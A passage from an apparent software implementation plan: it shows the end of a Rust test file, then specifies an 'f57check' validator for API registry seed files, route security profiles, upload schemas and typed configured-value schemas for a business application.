    assert!(shapes.expand_all_without_owner_code().is_ok());
}

#[test]
fn direct_routes_and_every_state_bearing_component_are_machine_closed() {
    let routes = load_api_direct_route_seed(FixtureRepo::real_repository()).unwrap();
    let component_states = load_api_component_state_domains(FixtureRepo::real_repository()).unwrap();
    let state_domains = load_api_state_domains(FixtureRepo::real_repository()).unwrap();
    assert_eq!(routes.rows().len(), 47);
    assert_eq!(routes.distinct_component_schema_count(), 111);
    assert_eq!(routes.security_profile_count(), 12);
    assert_eq!(routes.route_shape_profile_count(), 37);
    assert_eq!(routes.exact_header(), ["surface", "method", "path", "operation_id", "owner_task", "security_profile", "route_shape_profile", "request_schema", "result_schema", "error_schema", "error_code_set"]);
    assert!(routes.every_error_code_set_is_nonempty_sorted_unique_and_catalogued("docs/error-codes.md"));
    assert!(routes.every_reused_component_has_one_digest_and_sorted_profile_set());
    assert_eq!(component_states.rows().len(), 218);
    assert_eq!(state_domains.rows().len(), 65);
    assert_eq!(component_states.schema_keys(), load_api_component_shape_seed(FixtureRepo::real_repository()).unwrap().state_or_state_filter_schema_keys());
    assert!(component_states.rows().iter().all(|row| state_domains.contains_exact(&row.state_domain)));
    assert_eq!(component_states.domain_for("AllocationAcceptedV1"), "CASH_ALLOCATION_V1");
    assert_eq!(component_states.domain_for("CustomerReceiptViewV1"), "CASH_RECEIPT_V1");
    assert_eq!(component_states.domain_for("MaintenanceOccurrencePageV1"), "MAINTENANCE_OCCURRENCE_V1");
    assert_eq!(component_states.domain_for("ProjectReceiptMilestonePageV1"), "PROJECT_RECEIPT_MILESTONE_V1");
    assert_eq!(component_states.domain_for("PartUsageAcceptedV1"), "PART_USAGE_V1");
    assert!(component_states.every_stateful_list_and_inline_page_domain_matches());
    assert!(component_states.exact_joins_business_source_graphs_without_name_heuristics().is_ok());
}

#[test]
fn t_f57_gov_010() {
    assert!(verify_all_f57_registries(FixtureRepo::real_repository()).is_ok());
}

#[test]
fn t_f57_nfr_010() {
    assert!(verify_stable_error_envelopes_and_no_secret_detail(FixtureRepo::real_repository()).is_ok());
}
```

- [ ] **Step 2: Run the narrow tests and confirm failure**

Run: `cargo test -p ep-xtask f57check -- --nocapture`

Expected: FAIL because `f57check` and `reserved_f57_migrations` do not exist.

- [ ] **Step 3: Implement the checker and rebaseline the registries**

Parse `docs/f57-migration-reservations.tsv` into `MigrationReservation { version, task, path }`。Serialization is UTF-8 without BOM、LF-only，exact TSV header `version\ttask\tpath`，exactly 42 data rows sorted by numeric version ascending；version is an unquoted 14-digit decimal、task is `F57-NN`、path is the exact slash-normalized repository path from this plan, and no field may contain tab/newline. Reject a missing or extra row, duplicate version/path, version outside this block, filename/version mismatch, row-order change, unknown column, or a task whose minimum version is not greater than the preceding database task's maximum version.

Register exactly two command forms: `cargo xtask f57check --task F57-NN --phase pre-red|post-green` and `cargo xtask f57check --all --phase post-green`; missing/unknown phase, `--all pre-red`, duplicate task, or positional inference fails. Parse all 174 main rows and 11 boundary rows from `docs/superpowers/reviews/2026-08-23-f57-requirements-traceability.md`, then exact-join them to the 185 immutable seed rows in `docs/f57-task-ownership.seed.tsv`. The seed, not developer judgment, supplies the single owning task, activation task, exact TestID, concrete test path/symbol, EvidenceID, evidence schema and platform lane. Validate that each TestID is exactly `T-F57-<RequirementID>` and each EvidenceID is exactly `E-F57-<RequirementID>`。

Both ownership outputs use UTF-8 without BOM、LF-only and the seed's canonical physical order: the 174 main requirements in trace-matrix order followed by the 11 boundary requirements in `DEF-001…DEF-011` order. They must not apply an independent byte sort. `docs/generated/f57-task-manifest.tsv` has the exact same nine columns and header as the seed: `requirement_id\towner_task\tactivation_task\ttest_id\ttest_target_path\ttest_symbol\tevidence_id\tevidence_schema\tplatform_lane`；185 rows、no quoting、no tab/newline inside a field. `docs/f57-task-ownership.toml` has top-level exact fields `schema_version = 1` and `source_seed_sha256 = "<64 lowerhex>"`，followed by exactly 185 `[[binding]]` tables in that same canonical order；each table contains the same nine fields in the same order, all as TOML basic strings, with no unknown keys or duplicate tables. The TOML and TSV must round-trip to the seed byte-for-byte by logical field value and row order；generated-file manual edits、independent re-sorting or differing Unicode normalization fail.

Parse `docs/f57-api-discriminators.seed.tsv` as the sole machine authority for every current Control、Employee and Portal command/query discriminator. It is UTF-8 without BOM、LF-only, unquoted TSV with exact header `surface\tvariant_kind\twire_literal\towner_task\tintroduced_version\tpayload_schema\tresult_schema\terror_schema\tsubject_cas_mode\taudience\toperation_error_code` and exactly 437 data rows. Physical row order is `(surface CONTROL|EMPLOYEE|PORTAL, introduced_version canonical SemVer, variant_kind COMMAND|QUERY, wire_literal UTF-8 byte order)`；no scalar may contain a tab/newline. The only CAS modes are `CONTROL_CREATE_NO_CAS|CONTROL_PAYLOAD_CAS|CONTROL_UPSERT_CAS|CREATE_ZERO|MUTATE_POSITIVE|UPSERT_EXPLICIT|QUERY_NONE`，and audience is exactly `CONTROL_CENTER|EMPLOYEE_WORKBENCH|CUSTOMER_PORTAL|SUPPLIER_PORTAL` compatible with surface. `operation_error_code` is exactly `NONE` or an existing canonical row in `docs/error-codes.md`; exactly 22 non-`NONE` rows exist, all are F57-23 commands, and queries must always use `NONE`. Reject duplicate `(surface,variant_kind,wire_literal)`、unknown surface/kind/CAS/audience、wrong owner/version pair、empty or syntactically invalid schema name、unregistered/alias error code、default/wildcard/prefix discriminator、generic object/table/method literal、a query with a mutation CAS mode or a command with `QUERY_NONE`.

An API version slice is the ordered union of all rows for that surface whose `introduced_version` is not later than the selected version；rows are never deleted or silently renamed. The exact version/count/`x-planned-implementation-tasks` registry is closed:

| surface/version | cumulative command/query rows | exact `x-planned-implementation-tasks` |
|---|---:|---|
| `CONTROL/1.0.0-f57` | `20/17` | `[F57-16]` |
| `CONTROL/1.1.0-f57` | `39/29` | `[F57-16,F57-23]` |
| `CONTROL/1.2.0-f57` | `51/33` | `[F57-16,F57-23,F57-24]` |
| `EMPLOYEE/1.0.0-f57` | `7/6` | `[F57-18]` |
| `EMPLOYEE/1.1.0-f57` | `63/28` | `[F57-18,F57-19]` |
| `EMPLOYEE/1.2.0-f57` | `158/70` | `[F57-18,F57-19,F57-20]` |
| `EMPLOYEE/1.3.0-f57` | `227/99` | `[F57-18,F57-19,F57-20,F57-21]` |
| `EMPLOYEE/1.4.0-f57` | `230/102` | `[F57-18,F57-19,F57-20,F57-21,F57-23]` |
| `PORTAL/1.0.0-f57` | `10/11` | `[F57-22]` |

`f57check` always validates all 437 seed rows structurally, but exact-compares OpenAPI `oneOf`/extensions, Rust Task 6 registration, generated TypeScript and component existence only for the cumulative API slice due at the selected task/phase. PRE_RED may leave that selected task's newly owned slice absent; POST_GREEN requires it. A future-owner row is data only and does not require its future schema、Rust type、YAML branch or TypeScript branch to exist early. For each due row, exact-compare `x-f57-owner-task`、payload/result/error `$ref`、audience、CAS and `operation_error_code`; its error schema composes only the matching surface/kind shared set plus the row's non-`NONE` operation code. Missing、extra、stale、wrong-version、wrong-owner、wrong-audience、one-sided or duplicated due rows fail. Task 25 alone requires all 437 rows materialized and exact. The seed SHA-256 is included in every task-gate receipt and final aggregate；Task 25 validates it and never regenerates or repairs the seed.

Component shape is product data, never an owner-Rust inference. `docs/f57-api-component-shapes.seed.tsv` is immutable UTF-8/no-BOM/LF-only, unquoted TSV with exact header `schema_name\tcomponent_kind\towner_task\tshape_profile\tsubject_id_field\titem_ref\tconfig_schema\texplicit_field_set` and exactly 638 data rows: the exact distinct union of all 426 `payload_schema` and 212 `result_schema` names in the 437-row discriminator seed. Rows sort by `(schema_name UTF-8 bytes,component_kind PAYLOAD|RESULT)` and `(schema_name,component_kind)` is unique. Every discriminator payload/result exact-joins one row and every shape row is referenced. `owner_task` is the lowest numbered API-owner task that references that component (thereby deliberately making `DeliveryConfirmedV1` F57-20-owned and `ComplaintAcceptedV1` F57-21-owned); an owner mismatch, orphan, missing component, payload/result kind collision or alternative owner fails.

Direct HTTP surfaces are a second immutable machine input, not an exemption from component authority. `docs/f57-api-direct-routes.seed.tsv` is UTF-8/no-BOM/LF-only unquoted TSV with exact eleven-column header `surface\tmethod\tpath\toperation_id\towner_task\tsecurity_profile\troute_shape_profile\trequest_schema\tresult_schema\terror_schema\terror_code_set` and exactly 47 data rows: Control 12、Employee 16 and Portal 19. Rows sort by `(surface CONTROL|EMPLOYEE|PORTAL,path UTF-8 bytes,method)`；both `(surface,method,path)` and `operation_id` are unique. `NONE` is permitted only for a bodyless request, never for result/error；all other schema names match `^[A-Z][A-Za-z0-9]{0,126}V1$`. Exact union of request/result/error names is 111 schemas. The closed security-profile set is `CONTROL_BOOTSTRAP_ORIGIN|CONTROL_SESSION_CSRF|CONTROL_SESSION_READ|EMPLOYEE_BOOTSTRAP_DEVICE|EMPLOYEE_SESSION_DEVICE|EMPLOYEE_SESSION_DEVICE_READ|PORTAL_BOOTSTRAP_BINDING|PORTAL_BOOTSTRAP_INVITE|PORTAL_DISCRIMINATOR_AUDIENCE|PORTAL_ORIGINAL_COMMAND_BINDING|PORTAL_SESSION_BINDING_CSRF|PORTAL_SESSION_BINDING_READ`; the closed `route_shape_profile` set is the exact 37 values present in the seed. `error_code_set` is a nonempty `|`-joined UTF-8-byte-sorted unique set of exact codes already registered in `docs/error-codes.md`; it is the complete error enum for that route, not an extensible base. Owner、security、profile、each schema triple and the full error set come only from the row；OpenAPI/Rust/client code may exact-join but never rename, infer, union or add a route component/error.

The twelve `security_profile` values are executable closed predicates, not descriptive labels. All profiles first require the configured HTTPS authority、exact deployment host、bounded canonical request parsing、current generation compatibility where the route carries generation, current license/capability and fresh server-side authorization；no profile accepts actor、principal、role、device authority、legal entity、audience、policy、grant or storage locator from JSON. Browser profiles deny CORS, redirects and cross-site fetches；native profiles deny system-proxy/redirect/origin substitution. The exact additional predicate map is:

| security profile | exact additional predicate |
|---|---|
| `CONTROL_BOOTSTRAP_ORIGIN` | No prior session is trusted. Require the configured Control origin and same-origin fetch metadata, the strict password/MFA proofs in the start carrier, a server-issued single-use login challenge bound to `request_id` and origin, and the current account/device/login policy；consume the challenge before creating the Secure/HttpOnly/SameSite=Strict Control session and its session-bound CSRF proof. |
| `CONTROL_SESSION_CSRF` | Require an ACTIVE Control session cookie, exact deployment/origin/fetch binding and a single-use CSRF proof bound to session、origin、method、canonical path and request identity. Request identity is the strict body `request_id`, except raw chunk PUT where it is `(upload_id,chunk_no,If-Match,decoded Digest)`；reauth freshness and SoD are re-evaluated when the selected command/operation requires them. |
| `CONTROL_SESSION_READ` | Require the ACTIVE Control session and exact deployment/site binding, then current object/field/action authorization on every GET/SSE emission. Command receipts additionally exact-match the original principal/session class/legal entity/visibility and current authorization；stream cursors or object IDs never confer authority. No mutation CSRF is accepted as a substitute for these read predicates. |
| `EMPLOYEE_BOOTSTRAP_DEVICE` | No prior session is trusted. Require the strict password/MFA proof, an already registered device key and valid device proof bound to `request_id`、device ID and generation report, current attestation/device epoch and the Task 18 per-state bootstrap allowlist；the server issues only a session bound to that exact device epoch and directive. |
| `EMPLOYEE_SESSION_DEVICE` | Require an ACTIVE employee session bound to the same current device key/epoch, current attestation and the Task 18 per-route device-state allowlist. Verify the route carrier's canonical device proof/signature over method、canonical path、query、body digest、session、device epoch and request identity; the signed Employee command/query envelopes retain their stricter frozen preimages. Reject stale epoch、revoked/restricted-for-operation device、nonce replay、generation incompatibility and redirect/proxy substitution. |
| `EMPLOYEE_SESSION_DEVICE_READ` | Require the same ACTIVE session/device/epoch、attestation、generation and per-route state checks on each GET/stream reconnect, plus a single-use canonical request proof over method、path/query、session、device epoch and server challenge. Reauthorize every object/event/UI-schema result and bind command receipts to the original principal/device/legal entity/visibility；cursor、watermark、generation or file handle alone is never authority. |
| `PORTAL_BOOTSTRAP_BINDING` | Require the short-lived `__Host-ep_portal_bootstrap` Secure/HttpOnly/SameSite=Strict cookie, exact origin/fetch metadata and single-use `X-Portal-CSRF` bound to bootstrap instance、origin、method、path and `request_id`. Rebuild the candidate principal/binding/audience/legal-entity/party/contact/device solely from the verified login/recovery challenge and current relationship；no real session exists until the owning atomic transaction commits. |
| `PORTAL_BOOTSTRAP_INVITE` | Apply the same bootstrap cookie/origin/single-use-CSRF binding and additionally require the exact invite、channel、MFA、device、password-registration and terms proofs, positive invite CAS and one-use consumed challenge from Business §10.3. Audience/binding/party/contact come only from the invite；success creates the real session only after the activation transaction commits. |
| `PORTAL_DISCRIMINATOR_AUDIENCE` | Require an ACTIVE host-only Portal session, exact origin/fetch binding and single-use CSRF bound to session、binding、audience、method、path and `request_id`, for both POST commands and POST queries. The command/query discriminator row fixes the one permitted audience and must equal the session's currently ACTIVE binding/party/contact/legal entity/device projection；the body cannot select or widen it. |
| `PORTAL_ORIGINAL_COMMAND_BINDING` | Require the current ACTIVE Portal session/binding/device and exact deployment/site binding, then exact-match `request_id` to the original principal、binding、audience、legal entity、party/contact、device/session class and command visibility while re-running current read authorization. Wrong/narrowed/revoked context returns the stable non-enumerating denial and reveals neither receipt nor command existence. |
| `PORTAL_SESSION_BINDING_CSRF` | Require the ACTIVE `__Host-ep_portal_session` cookie、current binding/party/contact/device/authority epoch、exact origin/fetch metadata and single-use `X-Portal-CSRF` bound to session、binding、audience、method、canonical path and request identity. Identity is body `request_id`, except raw chunk PUT where it is `(upload_id,chunk_no,If-Match,decoded Digest)`；the upload handle must independently exact-match the same legal entity/binding/audience/object scope. |
| `PORTAL_SESSION_BINDING_READ` | Require that same current ACTIVE session/binding/party/contact/device/epoch and exact deployment/site binding, then reauthorize the exact upload/file object and legal entity on every GET. Upload ID、object/version ID、ETag or prior possession never grants visibility, and denial is non-enumerating. |

The generated OpenAPI security schemes、Rust middleware composition and all four clients exact-join each direct-route row to this map. `f57check` requires the map's key set to equal the twelve seed values, requires the profile on every route to be the row's literal profile, and runs positive plus missing/mismatched/replayed origin、cookie/session、CSRF/challenge、device key/epoch、binding/audience、generation、request identity and body-authority-forgery negatives. A route/profile swap、profile fall-through、optional predicate、trusted cursor/handle or generic “authenticated” fallback fails before handler execution.

The direct-profile library is closed product DSL. The token→definition map is exact and total；the right side names the request/result definition in this paragraph and the following Portal/file paragraphs, while the route row supplies its exact schema triple and complete error set:

- Control: `CONTROL_SESSION_START_V1→control.start`、`CONTROL_SESSION_REAUTH_V1→control.reauth`、`CONTROL_SESSION_END_V1→control.end`、`CONTROL_COMMAND_V1→control.command`、`CONTROL_QUERY_V1→control.query`、`CONTROL_COMMAND_RECEIPT_V1→control.receipt`、`CONTROL_EVENT_STREAM_V1→control.event`。
- Employee: `EMPLOYEE_SESSION_START_V1→employee.start`、`EMPLOYEE_SESSION_HANDSHAKE_V1→employee.handshake`、`EMPLOYEE_SESSION_RENEW_V1→employee.renew`、`EMPLOYEE_SESSION_END_V1→employee.end`、`EMPLOYEE_COMMAND_V1→employee.command`、`EMPLOYEE_QUERY_V1→employee.query`、`EMPLOYEE_COMMAND_RECEIPT_V1→employee.receipt`、`EMPLOYEE_TASK_STREAM_V1→employee.task_event`、`EMPLOYEE_UI_SCHEMA_GET_V1→employee.ui_schema`、`EMPLOYEE_DEVICE_ATTEST_V1→employee.device_attestation`、`EMPLOYEE_WIPE_RECEIPT_V1→employee.wipe_receipt`。
- Shared file: `FILE_UPLOAD_CREATE_V1→file.create`、`FILE_UPLOAD_STATUS_V1→file.status`、`FILE_UPLOAD_CHUNK_V1→file.chunk`、`FILE_UPLOAD_COMPLETE_V1→file.complete`、`FILE_VERSION_GET_V1→file.version_get`。
- Portal: `PORTAL_INVITATION_ACCEPT_V1→portal.invitation_accept`、`PORTAL_SESSION_START_V1→portal.session_start`、`PORTAL_SESSION_RENEW_V1→portal.session_renew`、`PORTAL_SESSION_END_V1→portal.session_end`、`PORTAL_RECOVERY_START_V1→portal.recovery_start`、`PORTAL_RECOVERY_PROVE_V1→portal.recovery_prove`、`PORTAL_RECOVERY_COMPLETE_V1→portal.recovery_complete`、`PORTAL_AUTHENTICATOR_REGISTER_V1→portal.authenticator_register`、`PORTAL_AUTHENTICATOR_REVOKE_V1→portal.authenticator_revoke`、`PORTAL_DEVICE_REGISTER_V1→portal.device_register`、`PORTAL_DEVICE_REVOKE_V1→portal.device_revoke`、`PORTAL_COMMAND_V1→portal.command`、`PORTAL_QUERY_V1→portal.query`、`PORTAL_COMMAND_RECEIPT_V1→portal.receipt`。

The parser exact-compares this 37-key set to the seed's unique `route_shape_profile` set and rejects a missing/extra/duplicate key or a right-side definition without one strict request/result expansion. Control request/result carriers are exactly: start=`{request_id,login_hint,password_proof,mfa_proof}/{session_id,csrf_proof,authoritative_generation,expires_at}`、reauth=`{request_id,mfa_proof,reason}/{session_id,reauthenticated_at,reauth_expires_at}`、end=`{request_id,reason}/{session_id,ended_at,audit_entry_id}`、command=`ControlCommandV1/{correlation_id,authoritative_generation,audit_entry_id,value}`、query=`ControlQueryV1/{correlation_id,authoritative_generation,value,next_cursor}`、receipt strict oneOf `PENDING={kind:"PENDING",correlation_id,request_id,authoritative_generation,retry_after_seconds}` or `COMPLETED={kind:"COMPLETED",correlation_id,request_id,authoritative_generation,audit_entry_id,value}`、event=`{event_id,watermark,event_kind,subject_ref,generation}`. Employee carriers are exactly: start=`{request_id,login_hint,password_proof,mfa_proof,device_id,device_proof,generation_report}/{session_id,device_epoch,directive,expires_at}`、handshake=`ClientGenerationReportV1/ClientGenerationDirectiveV1`、renew=`{request_id,refresh_proof,device_proof,generation_report}/{session_id,device_epoch,directive,expires_at}`、end=`{request_id,reason}/{session_id,ended_at,audit_entry_id}`、command=`EmployeeCommandEnvelopeV1/{correlation_id,authoritative_generation,subject_version,audit_entry_id,value}`、query=`{request_id,query_type,generation,generation_report,client_version,device_key_id,payload,device_signature}/{correlation_id,authoritative_generation,value,next_cursor}`、receipt uses the same PENDING/COMPLETED discriminator plus `subject_version` on COMPLETED、task event=`{event_id,watermark,event_kind,subject_ref,generation}`、UI schema=`{generation,ui_schema_sha256,capability_matrix_sha256,minimum_client_version,recommended_client_version,signed_generation_ref}`、device attestation=`{request_id,device_id,attestation_policy_id,attestation_bytes_b64url,attestation_sha256}/{device_id,state,device_epoch,row_version,attested_at,audit_entry_id}` and wipe receipt=`{request_id,device_id,wipe_command_id,outcome,endpoint_receipt_b64url,endpoint_receipt_sha256}/{device_id,receipt_id,outcome,device_epoch,row_version,audit_entry_id}` with outcome exactly `ENDPOINT_ERASURE_CONFIRMED|ENDPOINT_ERASURE_FAILED`。Every field is required unless explicitly carried as a oneOf alternative；IDs、digests、time、versions、cursor/ref and canonical base64url use the Task 1 strict tokens, and every `value|payload|directive|proof|attestation|subject_ref` is a named closed `$ref`, never a map.

Portal non-file request fields are exactly the Task 22 sets and their direct-profile results are fixed. Invitation acceptance returns the authoritative Business §10.3 `PortalCredentialActivationReceiptV1` verbatim, with exactly `{receipt_id,invite_id,principal_id,binding_id,audience,legal_entity_id,party_kind,party_id,contact_id,authenticator_ids,device_id,session_id,refresh_family_id,channel_proof_digest,mfa_proof_digest,terms_version,terms_evidence_digest,activated_at,generation,audit_ref}` and no competing short receipt；`party_kind=CUSTOMER|SUPPLIER`, `authenticator_ids` and all cross-binding constraints are those same authoritative §10.3 rules. Session start/renew return `{session_id,binding_id,audience,device_epoch,expires_at,absolute_expires_at,generation}` and end returns `{session_id,state:"CLOSED",ended_at,audit_entry_id}`；recovery start/prove/complete return respectively `{recovery_id,challenge_kind,challenge_digest,expires_at,generation}`、`{recovery_id,state:"PROOF_ACCEPTED",accepted_at,audit_entry_id}` and `{binding_id,state:"ACTIVE",binding_version,credential_epoch,generation,audit_entry_id}`；authenticator/device changes return `{authenticator_id,state,row_version,generation,audit_entry_id}` and `{device_id,state,device_epoch,row_version,generation,audit_entry_id}` with state exact-joined to the Portal graph；Portal command/query carriers are the exact Task 22 envelopes/results and receipt is strict PENDING/COMPLETED oneOf. Proof/attestation/registration fields expand only to `PASSWORD_PROOF={kind:"PASSWORD_PROOF",challenge_sha256,proof_b64url}`、`TOTP_PROOF={kind:"TOTP_PROOF",challenge_sha256,proof_b64url}`、`WEBAUTHN_PROOF={kind:"WEBAUTHN_PROOF",challenge_sha256,credential_id,authenticator_data_b64url,client_data_sha256,signature_b64url}`、`DEVICE_PROOF={kind:"DEVICE_PROOF",challenge_sha256,device_key_id,signature_b64url}`、`CHANNEL_PROOF={kind:"CHANNEL_PROOF",channel_kind,challenge_sha256,proof_b64url}` and the matching public-key/attestation registration objects；all canonical byte strings are 1..65536 bytes before base64url, digests bind decoded bytes, and private keys/password/TOTP secrets/refresh credentials are never fields.

The shared file profiles are asynchronous and exact. `CreateUploadSessionRequestV1={request_id,target_object_ref,file_name,media_type,size_bytes,file_sha256,chunk_size_bytes,chunk_count}` and `UploadSessionCreatedV1={ingest_id,upload_id,state:"UPLOADING",row_version,chunk_size_bytes,chunk_count,expires_at,status_path}`；size is 1..2 GiB, chunk size 64 KiB..8 MiB and count must equal ceiling(size/chunk size). `RawUploadChunkV1` is not JSON: path `chunk_no` is integer `0..chunk_count-1`, request `Content-Type=application/octet-stream`, exact `Content-Length=1..chunk_size_bytes`, required `Digest: sha-256=<canonical base64>` and `If-Match=<positive row_version>`, and the raw body digest must match both header and declared session chunk. `UploadChunkAcceptedV1={upload_id,chunk_no,chunk_sha256,next_missing_chunk_no,row_version}` with `next_missing_chunk_no` present nullable. `CompleteUploadSessionRequestV1={request_id,expected_row_version,ordered_chunk_sha256s,file_sha256}` returns immediately as `FileIngressAcceptedV1={ingest_id,upload_id,state:"QUARANTINED",row_version,status_path,accepted_at}` after durable quarantine acceptance；it never waits for scanning and never returns a published ref. `UploadSessionStatusV1` is strict oneOf on state: `UPLOADING={ingest_id,upload_id,state,row_version,received_chunk_nos,missing_chunk_nos,expires_at}`、`QUARANTINED={ingest_id,upload_id,state,row_version,quarantined_at}`、`SCANNING={ingest_id,upload_id,state,row_version,scan_started_at,scanner_definition_sha256}`、`PUBLISHED={ingest_id,upload_id,state,row_version,published_attachment_ref,published_at,scan_evidence_ref}` or `REJECTED={ingest_id,upload_id,state,row_version,rejection_code,rejected_at,evidence_ref}`；`published_attachment_ref` exists only in PUBLISHED. Clients poll the seed's status GET using server `Retry-After` plus capped exponential backoff/jitter and may bind/download only after PUBLISHED. `PublishedFileVersionV1` exposes exact immutable metadata/body headers `{object_id,version_id,file_name,media_type,size_bytes,file_sha256,content_disposition,etag}` plus raw bytes matching size/digest, never a storage path/locator or bare latest.

Each of the 111 direct names expands from its row/profile to canonical JSON Schema (or the one RawUploadChunk transport schema) with all nested objects and oneOf branches closed. Direct error schemas use the same exact stable envelope fields as their surface and the route row's literal complete `error_code_set`; no security/profile union, default addition, owner-selected member or implementation fallback is permitted. The compiler emits a unique component record `{schema_name,component_kind,owner_task,route_refs,route_shape_profiles,canonical_schema_sha256,rust_type_path}` where `route_refs` is the sorted nonempty exact set of `METHOD path#operationId` rows and `route_shape_profiles` is the UTF-8-byte-sorted unique nonempty set of profiles at whose request/result/error position that schema occurs. Every occurrence must independently expand to the same canonical schema digest. Thus shared file components and `PortalAuthenticatorChangedV1`/`PortalDeviceChangedV1` may carry multiple profiles only when their position-specific expansion is byte-identical；a differing profile digest, singular-profile overwrite, orphan/unnamed nested component, unconstrained object, unknown/unsorted error, missing route ref or Rust-derived expectation fails.

Every component field named `state` and every stateful list payload's `states` filter has a separate finite product enum. `docs/f57-api-component-state-domains.seed.tsv` has exact header `schema_name\tcomponent_kind\towner_task\tstate_domain` and exactly 218 rows, sorted by `(schema_name,component_kind)`：all 146 outer state-bearing RESULT components、57 `LIST_CONFIGURED_V1` PAYLOAD components and 15 `PAGE_V1+INLINE_CONFIGURED_ITEM_V1` RESULT components whose item carries state. A paired list/inline page must name the same domain. Metric evidence、work-order evidence and incident evidence instead use the closed stateless profiles and therefore cannot expose a fake state/filter；AuthorizedSearch also uses a stateless page because its fields are definition-bound values. Its schema-key set exact-equals the 638-shape expansion's state-or-state-filter key set and its owner exact-equals the shape row. `docs/f57-api-state-domains.seed.tsv` has exact header `state_domain\tstate_values` and exactly 65 rows sorted by `state_domain`；`state_values` is a nonempty `|`-joined byte-sorted unique list of exact `STATE_CODE` literals. Every component-state row exact-joins one domain and every domain is referenced. Schema expansion replaces the lexical `STATE_CODE`/`STATE_CODE_SET` placeholder with that row's exact enum/subset (including nested page item refs). The semantic `UNKNOWN` value is intentional and permitted only in the three exact current domains `EFFECT_V1|PAYMENT_V1|REFUND_V1`；it is not a generic fallback. Generic regex acceptance、owner-defined extra state、`OTHER|CUSTOM`、`UNKNOWN` in any other domain、missing mapping、unreferenced domain or graph-token drift fails before Rust inspection.

`shape_profile` is the closed thirteen-value DSL `CREATE_CONFIGURED_V1|PATCH_CONFIGURED_V1|ACTION_CONFIGURED_V1|GET_BY_ID_V1|LIST_CONFIGURED_V1|LIST_STATELESS_CONFIGURED_V1|EXECUTE_QUERY_CONFIGURED_V1|ACCEPTED_V1|CHANGED_V1|VIEW_CONFIGURED_V1|PAGE_V1|PAGE_STATELESS_CONFIGURED_V1|EXPLICIT_FIELDS_V1`。Profile expansion happens from the immutable discriminator/component/component-state/state-domain seeds before any Rust/OpenAPI/TypeScript is inspected. Exact outer fields are: create=`[<subject_id_field when non-NONE>,values]`; patch=`[<subject_id_field>,<expected_row_version only for CONTROL_PAYLOAD_CAS or CONTROL_UPSERT_CAS>,patch]`; action=`[<subject_id_field>,<same Control-only CAS rule>,input]`; get=`[<subject_id_field>]`; stateful list=`[states,subject,page_size,cursor]`; stateless list=`[subject,page_size,cursor]`; execute-query=`[query,page_size,cursor]`; accepted/changed=`[<subject_id_field>,state,row_version]`; view=`[<subject_id_field>,state,row_version,values]`; stateful page=`[items,next_cursor]` with inline item `[<subject_id_field>,state,row_version,values]`; stateless page=`[items,next_cursor]` with inline item `[<subject_id_field>,row_version,values]`。Every listed field is required. `states` is a byte-sorted unique array of 0..64 values from the paired page/result's exact state domain (never arbitrary `STATE_CODE`); `subject` is `F57ConfiguredQueryValuesV1|null`; `page_size` is integer 1..200; `cursor` and `next_cursor` are `CURSOR|null`; execute-query's `query` is non-null; page `items` is an ordered array of 0..200 exact item refs. All nullable fields are present as JSON null, never omitted. Employee/Portal subject CAS remains solely in their command envelope, while Control payload CAS appears exactly once by the joined discriminator mode. A missing, duplicated or second version field, profile/kind mismatch, stateless profile with a state mapping, stateful list/page domain mismatch or two referencing discriminator rows that give one payload component different CAS modes fails.

The parameter columns are semantic, not comments. `subject_id_field` is `NONE` only where that profile permits it, otherwise an exact lower-snake JSON property matching `^[a-z][a-z0-9_]{0,63}$`; its value is the closed `SubjectIdV1` canonical string and cannot be a caller-selected table/key expression. `item_ref` is `NONE` except for `PAGE_V1`, where it is either an existing RESULT component owned no later than the page and expanded as the exact item `$ref`, or `INLINE_CONFIGURED_ITEM_V1`, whose item is exactly `[<subject_id_field>,state,row_version,values]`. Cycles, cross-kind refs, unknown refs and a page whose ref/subject/config combination is not one of those two forms fail.

`config_schema` is exactly `NONE|CONFIGURED_CREATE_VALUES_V1|CONFIGURED_PATCH_VALUES_V1|CONFIGURED_ACTION_VALUES_V1|CONFIGURED_QUERY_VALUES_V1|CONFIGURED_RECORD_VALUES_V1` with the profile-specific value fixed in the seed; it is not a path or a future implementer-authored JSON Schema. The token expands respectively to exact `F57ConfiguredCreateValuesV1={schema_ref,fields}`、`F57ConfiguredPatchValuesV1={schema_ref,operations}`、`F57ConfiguredActionValuesV1={schema_ref,arguments}`、`F57ConfiguredQueryValuesV1={schema_ref,predicate,sort,projection_field_ids}` and `F57ConfiguredRecordValuesV1={schema_ref,fields}`。The property name is always `schema_ref`, whose exact type is `F57ConfiguredSchemaRefV1={schema_id,schema_version,generation,schema_sha256}`；no `schema|schema_id` alias is accepted. The ref exact-joins one active Task 10 relational schema definition and request generation. `fields` and `arguments` are 0..512 `F57ConfiguredFieldValueV1={field_id,value}` rows byte-sorted/unique by field_id; record fields are output-only. `operations` is 1..512 `{field_id,op,value}` rows byte-sorted/unique by field_id, `op=SET|CLEAR`, with `value=null` iff CLEAR and typed non-null value iff SET. Query `predicate` is required `FILTER_AST|null`; `sort` is 0..32 exact `SORT_SPEC_SET`; `projection_field_ids` is a byte-sorted unique array of 1..128 registered field IDs.

`F57ConfiguredValueV1` is the exact discriminator union `NULL={kind:"NULL"}`、`BOOL={kind:"BOOL",value:boolean}`、`I64={kind:"I64",value:integer -2^63..2^63-1}`、`DECIMAL={kind:"DECIMAL",value:canonical decimal string ^-?(0|[1-9][0-9]{0,37})(\.[0-9]{1,18})?$}`、`TEXT={kind:"TEXT",value:NFC string 0..65536 scalars}`、`DATE={kind:"DATE",value:YYYY-MM-DD}`、`TIMESTAMP={kind:"TIMESTAMP",value:RFC3339 UTC whole-second}`、`ENTITY_REF={kind:"ENTITY_REF",value:{object_type,object_id,object_version}}`、`MONEY={kind:"MONEY",value:{currency,minor_units}}`、`ENUM={kind:"ENUM",value:NFC code 1..128}`、`FILE_REF={kind:"FILE_REF",value:{object_id,version_id,file_sha256}}` or `LIST={kind:"LIST",value:F57ConfiguredValueV1[0..256]}`。Currency is ISO-4217 uppercase, minor_units is signed i64, all nested objects reject unknown fields, LIST has maximum nesting depth 4, and there is no OBJECT/map variant. Schema-ref mismatch, unknown/duplicate field ID, field type drift, forbidden field, inactive generation, unsorted set, arbitrary JSON object, `additionalProperties:true` or an unconstrained `object`/`map` fails. This preserves a completely customizable relational database without making the public API structurally free-form.

